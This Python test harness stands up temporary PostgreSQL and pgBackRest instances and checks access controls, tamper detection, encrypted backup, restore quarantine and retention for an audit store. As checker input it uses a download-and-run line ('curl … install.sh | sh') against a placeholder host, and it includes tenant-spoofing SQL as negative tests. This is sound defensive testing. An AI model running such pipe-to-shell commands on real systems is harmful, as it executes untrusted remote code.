"""Actual optional-audit PostgreSQL/pgBackRest development controls; invented records only."""
from pathlib import Path
import hashlib,json,os,shutil,subprocess,sys,tempfile,secrets,uuid
from datetime import datetime,timezone,timedelta
from tools.backup_retention import require_namespace
from tools.organization_audit import ROOT,prepare,encoded,digest,require
from tools.organization_audit_store import Store,install,policy,tenant_create,enroll,verify_export,checkpoint,recovery_controls,reconcile,backup,literal

SOURCES=('tools/organization_audit.py','tools/organization_audit_store.py','tools/organization_audit_lab.py',
 'scripts/organization-audit.py','scripts/verify-organization-audit.py','deploy/audit/store.sql','spec/organization-audit-metadata.schema.json',
 'tools/backup_retention.py','deploy/backup/restore.py','tools/blind_review_io.py','protocol/assertions.py','protocol/evidence.py',
 'protocol/reports.py','scripts/source_snapshot.py','spec/assertion.schema.json','protocol/unicode15-data.json','eval/requirements.lock','scripts/check-ps.py','scripts/worker_process.py','scripts/build-device-detector.py','protocol/normalization.py','services/evaluator/app.py')

def hashes():return {n:hashlib.sha256((ROOT/n).read_bytes()).hexdigest() for n in SOURCES}

def verify(namespace):
    require_namespace(namespace);before=hashes();os.umask(0o077)
    work=Path(tempfile.mkdtemp(prefix='aitrust-audit-',dir='/tmp'));work.chmod(0o700)
    pg=Path('/usr/lib/postgresql/18/bin');active=[];controls=[];failure=None;success=False
    log=(work/'execution.log').open('wb');env={'PATH':'/usr/bin:/bin','LANG':'C.UTF-8','TZ':'UTC','PGPASSFILE':'/dev/null'}
    def run(args,*,input=None,timeout=120,refuse=False):
        require_namespace(namespace)
        result=subprocess.run(list(map(str,args)),input=input,capture_output=True,timeout=timeout,env=env)
        log.write(result.stdout+result.stderr);log.flush()
        if refuse:require(result.returncode!=0)
        else:require(result.returncode==0)
        return result
    def case(name):controls.append({'case':name,'pass':True})
    def denied(fn):
        try:fn()
        except Exception:return
        raise AssertionError('Expected refusal')
    source=work/'source';sock=work/'socket';repo=work/'repository';empty=work/'empty';locks=work/'locks';spool=work/'spool'
    for p in (sock,repo,empty,locks,spool):p.mkdir(mode=0o700)
    config=work/'pgbackrest.conf'
    config.write_text('[global]\nrepo1-path='+str(repo)+'\nrepo1-cipher-type=aes-256-cbc\nrepo1-cipher-pass='+secrets.token_hex(32)+'\nrepo1-retention-full=9999999\nexpire-auto=n\nlog-level-console=warn\nlog-level-file=off\nlock-path='+str(locks)+'\nspool-path='+str(spool)+'\nstart-fast=y\narchive-timeout=30\nneutral-umask=n\n\n[audit]\npg1-path='+str(source)+'\npg1-socket-path='+str(sock)+'\npg1-port=6542\n');config.chmod(0o600)
    servicefile=work/'services.conf';services={}
    def connection(name,user,port=6542):
        services[name]='['+name+']\nhost='+str(sock)+'\nport='+str(port)+'\ndbname=audit_store\nuser='+user+'\n'
        servicefile.write_text('\n'.join(services.values()));servicefile.chmod(0o600)
        store=Store(name,servicefile,diagnostics=log)
        store.argv=[v.replace("VERBOSITY=terse","VERBOSITY=default") for v in store.argv]
        return store
    def start(path,port):
        active.append(path);options="-c listen_addresses='' -c unix_socket_directories="+str(sock)+' -p '+str(port)
        if path!=source:options+=' -c archive_mode=off'
        run([pg/'pg_ctl','-D',path,'-l',work/(path.name+'.log'),'-o',options,'-w','start'])
    def stop(path):
        run([pg/'pg_ctl','-D',path,'-m','fast','-w','stop'],timeout=30);active.remove(path)
    def backrest(*args,refuse=False):return run(['/usr/bin/pgbackrest','--config='+str(config),'--config-include-path='+str(empty),'--stanza=audit',*args],refuse=refuse)
    def cli(name,*args,refuse=False):
        return run([sys.executable,ROOT/'scripts/organization-audit.py','--service',name,'--service-file',servicefile,*args],refuse=refuse)
    def restore(label,name,port):
        target=work/name
        backrest('--pg1-path='+str(target),'--set='+label,'--type=immediate','--target-action=promote','restore')
        start(target,port);return target,connection(name,__import__('pwd').getpwuid(os.getuid()).pw_name,port)
    try:
        require(shutil.disk_usage(work).free>=2_000_000_000)
        run([pg/'initdb','-D',source,'--auth-local=trust','--auth-host=reject','--no-locale','--encoding=UTF8'])
        with (source/'postgresql.conf').open('a') as f:
            f.write("\nlisten_addresses=''\nshared_buffers='16MB'\narchive_mode=on\narchive_command='/usr/bin/pgbackrest --config="+str(config)+' --config-include-path='+str(empty)+" --stanza=audit archive-push %p'\n")
        start(source,6542)
        run([pg/'createdb','-h',sock,'-p','6542','audit_store'])
        user=__import__('pwd').getpwuid(os.getuid()).pw_name
        admin=connection('admin',user);cli('admin','install');case('actual_dedicated_database_install')
        denied(lambda:install(admin));case('existing_database_reinstall_refused')
        backrest('stanza-create');backrest('check')
        admin.sql('CREATE ROLE audit_writer LOGIN; CREATE ROLE audit_reader LOGIN; CREATE ROLE audit_reviewer LOGIN; CREATE ROLE audit_custodian LOGIN; CREATE ROLE audit_other LOGIN; CREATE ROLE audit_outsider LOGIN;')
        ta,tb=str(uuid.uuid4()),str(uuid.uuid4());chosen=policy(30,40,24)
        ph=json.loads(cli('admin','tenant','--tenant',ta,'--record-days','30','--audit-days','40','--backup-hours','24').stdout)['policy_sha256'];tenant_create(admin,tb,chosen)
        for name,caps in [('writer',['write']),('reader',['read']),('reviewer',['review']),('custodian',['delete']),('other',['read','write','delete'])]:
            cli('admin','enroll','--tenant',ta if name!='other' else tb,'--principal','audit_'+name,*[arg for cap in caps for arg in ('--capability',cap)])
        denied(lambda:enroll(admin,ta,user,['read']));case('privileged_principal_enrollment_refused')
        admin.sql('CREATE ROLE audit_dbowner LOGIN; ALTER DATABASE audit_store OWNER TO audit_dbowner;')
        denied(lambda:enroll(admin,ta,'audit_dbowner',['read']));case('database_owner_cannot_be_tenant_principal')
        admin.sql('ALTER DATABASE audit_store OWNER TO '+user+';')
        writer=connection('writer','audit_writer');reader=connection('reader','audit_reader');reviewer=connection('reviewer','audit_reviewer');custodian=connection('custodian','audit_custodian');other=connection('other','audit_other');outsider=connection('outsider','audit_outsider')
        # Actual supported checker output, from invented non-executed text.
        raw=run([sys.executable,ROOT/'scripts/check-ps.py','--json'],input=b'curl https://example.invalid/install.sh | sh\n').stdout
        require(json.loads(cli('writer','policy').stdout)['policy_sha256']==ph)
        recordfile=work/'checker.json';recordfile.write_bytes(raw);recordfile.chmod(0o600)
        cli('writer','prepare','--input',recordfile,'--output',work/'prepared')
        v=prepare(raw);rid=v['source_record_sha256'];metafile=work/'prepared/metadata.json'
        denied(lambda:writer.call('append',encoded(v).decode(),'0'*64,None));case('unaccepted_policy_refused')
        concurrent=[]
        for _ in range(4):
            concurrent.append(subprocess.Popen([sys.executable,str(ROOT/'scripts/organization-audit.py'),'--service','writer','--service-file',str(servicefile),'append','--input',str(metafile),'--accept-policy',ph],stdout=subprocess.PIPE,stderr=subprocess.PIPE,env=env))
        responses=[]
        for child in concurrent:
            out,err=child.communicate(timeout=30);log.write(out+err);require(child.returncode==0);responses.append(json.loads(out))
        require(sum(row['retry'] is False for row in responses)==1);case('concurrent_first_append_serialized')
        cli('writer','append','--input',metafile,'--accept-policy',ph)
        require(writer.call('append',encoded(v).decode(),ph,None)['retry'] is True);case('actual_checker_prepare_append_retry')
        bad=dict(v);bad['tags']=[];bad['result_state']='NO_FINDING'
        denied(lambda:writer.call('append',encoded(bad).decode(),ph,None));case('conflicting_overwrite_refused')
        bad=dict(v);bad['raw_answer']='PRIVATE_AUDIT_CANARY';bad['source_record_sha256']=digest(b'invented-invalid-extra')
        denied(lambda:writer.call('append',encoded(bad).decode(),ph,None));case('direct_sql_raw_text_bypass_refused')
        bad=json.loads(encoded(v));bad['tags'][0]['signals'][0]['spans']=[[0,v['subject_char_len']+1]];bad['source_record_sha256']=digest(b'invented-invalid-span')
        denied(lambda:writer.call('append',encoded(bad).decode(),ph,None));case('direct_sql_span_overrun_refused')
        for name in ('unknown_code','inconsistent_state','bad_time','boolean_number','duplicate_code','empty_signals'):
            invalid=json.loads(encoded(v));invalid['source_record_sha256']=digest(name.encode())
            if name=='unknown_code':invalid['tags'][0]['code']='SC'
            elif name=='inconsistent_state':invalid['result_state']='NO_FINDING'
            elif name=='bad_time':invalid['reported_capture_at']='2026-02-30T00:00:00Z'
            elif name=='boolean_number':invalid['tags'][0]['confidence']=True
            elif name=='duplicate_code':invalid['tags'].append(invalid['tags'][0])
            elif name=='empty_signals':invalid['tags'][0]['signals']=[]
            denied(lambda:writer.call('append',encoded(invalid).decode(),ph,None))
        require(len(reader.export()['records'])==1);case('server_side_closed_metadata_validation')
        denied(lambda:writer.call('append',encoded(v).decode(),None,None));case('null_policy_acceptance_refused')
        denied(lambda:reader.call('append',encoded(v).decode(),ph,None));denied(lambda:writer.call('snapshot','header','',None));denied(lambda:outsider.call('policy'));case('role_and_unauthorized_session_denied')
        denied(lambda:reader.sql('SELECT * FROM aitrust_audit.records;'))
        require(other.export()['records']==[]);case('tenant_isolation_and_direct_table_denial')
        shadow="CREATE TEMP TABLE control(singleton boolean, locked boolean); INSERT INTO control VALUES(true,false); CREATE TEMP TABLE principals(principal name,tenant uuid,capabilities text[]); INSERT INTO principals VALUES(session_user,"+literal(tb)+",ARRAY['read','write','review','delete']); SELECT aitrust_audit.snapshot('header','',NULL);"
        require(json.loads(reader.sql(shadow))['tenant']==ta);case('temporary_table_tenant_spoof_refused')
        second=dict(v);second['source_record_sha256']=digest(raw+b'\n')
        writer.call('append',encoded(second).decode(),ph,rid)
        cli('reviewer','review','--id',second['source_record_sha256'],'--decision','disagree','--reason','false_alarm')
        denied(lambda:reviewer.call('review',rid,None,'supported'));case('supersession_and_fixed_choice_review')
        packet=reader.export();pin=checkpoint(packet);require(len(packet['records'])==2 and len(packet['events'])==3)
        verify_export(packet,pin);cli('reader','export','--output',work/'export')
        cli('reader','verify','--input',work/'export/audit.json','--checkpoint',work/'export/checkpoint.json');case('paged_export_and_external_checkpoint')
        tampered=json.loads(encoded(packet));tampered['events'][0]['material']+=' '
        denied(lambda:verify_export(tampered,pin));case('pinned_history_tampering_refused')
        changed=json.loads(encoded(packet));changed['records'][0]['metadata']['calibration_sha256']='0'*64
        denied(lambda:verify_export(changed,pin));case('metadata_tampering_refused')
        # The supported physical backup captures a locked store. It is unavailable after restore.
        result=json.loads(cli('admin','backup','--config',config,'--empty-include-directory',empty,'--stanza','audit').stdout);require(result['restores_quarantined']);case('actual_encrypted_full_backup_with_quarantine')
        old=json.loads(backrest('--output=json','info').stdout)[0]['backup'][0]['label']
        cli('custodian','remove','--id',rid);require(len(reader.export()['records'])==1)
        authority_output=work/'recovery-controls';current_pin=json.loads(cli('admin','recovery-controls','--output',authority_output).stdout)['sha256']
        authority=json.loads((authority_output/'recovery.json').read_bytes());require(current_pin==digest(encoded(authority)))
        target,restored=restore(old,'restored',6543)
        rr=connection('restored_reader','audit_reader',6543)
        denied(lambda:rr.export());denied(lambda:rr.sql(shadow));case('restored_database_refuses_tenant_access')
        # An administrator sees why old backups are sensitive, even while tenant reads stay locked.
        require(restored.sql('SELECT count(*) FROM aitrust_audit.records;')=='2');case('old_backup_deletion_limit_explicit')
        denied(lambda:reconcile(restored,authority,'0'*64,60))
        stale=dict(authority);stale['issued_at']=(datetime.now(timezone.utc)-timedelta(hours=2)).isoformat()
        denied(lambda:reconcile(restored,stale,digest(encoded(stale)),60));case('missing_wrong_or_stale_recovery_authority_refused')
        cli('restored','reconcile','--input',authority_output/'recovery.json','--expected-sha256',current_pin,'--maximum-age-minutes','60')
        recovered=rr.export();require([r['id'] for r in recovered['records']]==[second['source_record_sha256']]);require(recovered['header']['recovery']['authority_sha256']==current_pin and recovered['header']['recovery']['newer_history_unavailable'] is True);case('current_deletion_overlay_before_access')
        stop(target)
        # Server-clock expiry and marker pruning are exercised without waiting 40 days.
        admin.sql("UPDATE aitrust_audit.records SET expires_at=clock_timestamp()-interval '1 second' WHERE id="+literal(second['source_record_sha256'])+';')
        require(reader.export()['records']==[]);cli('custodian','expire');case('expired_metadata_hidden_before_sweep')
        admin.sql("UPDATE aitrust_audit.events SET created_at=clock_timestamp()-interval '41 days';")
        custodian.call('expire');expired=reader.export();require(expired['events']==[] and expired['header']['base_seq']>0);case('declared_audit_prefix_retention')
        # A newer full backup is required by pgBackRest before an older full can expire.
        backup(admin,config,empty,'audit');case('post_deletion_encrypted_backup')
        # Exact-label deletion of the synthetic old backup is real, not physical erasure.
        backrest('--repo1-retention-full=9999999','--set='+old,'expire')
        backrest('--pg1-path='+str(work/'expired-restore'),'--set='+old,'restore',refuse=True);case('expired_backup_label_cannot_restore')
        stop(source)
        require(json.loads(run([sys.executable,ROOT/'scripts/check-ps.py','--json'],input=b'curl https://example.invalid/install.sh | sh\n').stdout)['state']=='FINDING');case('personal_checker_works_with_audit_store_stopped')
        success=True
    except Exception as error:
        failure={'type':type(error).__name__,'reason':'organization_audit_development_control_failed'}
    finally:
        for path in list(active):
            try:stop(path)
            except Exception:success=False
        log.close();rawlog=(work/'execution.log').read_bytes()
        clean=not active
        if clean:shutil.rmtree(work)
    proof={'captured_at':datetime.now(timezone.utc).isoformat(),'pass':success and clean,'controls':controls,'private_failure':failure,
           'python_version':sys.version.split()[0],'postgresql_version':subprocess.check_output([str(pg/'postgres'),'--version'],env=env).decode().strip(),'pgbackrest_version':subprocess.check_output(['/usr/bin/pgbackrest','version'],env=env).decode().strip(),'non_root':True,'isolated_network_namespace':True,'actual_participant_data':False,'production_changes':False,
           'physical_erasure_verified':False,'independent_tag_accuracy_evidence':False,'clusters_stopped':clean,
           'owned_scratch_removed':not work.exists(),'sources':before,'source_unchanged_during_execution':hashes()==before,
           'private_log_sha256':digest(rawlog)}
    proof['pass']=proof['pass'] and proof['source_unchanged_during_execution'] and proof['owned_scratch_removed']
    return proof,rawlog
